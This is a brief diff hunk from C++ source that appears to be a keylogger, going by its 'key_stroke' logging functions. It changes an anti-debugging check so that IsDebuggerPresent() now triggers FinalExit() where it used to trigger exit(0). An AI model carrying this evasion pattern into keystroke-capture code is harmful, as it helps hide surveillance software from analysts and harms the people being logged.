@@ -70,7 +70,7 @@ void Log::LogItInt(int key_stroke) {
 void Log::LogItChar(std::string Value) {
 #ifndef debug
     if (IsDebuggerPresent()) {
-        exit(0);
+        FinalExit();
     }
 
 #endif
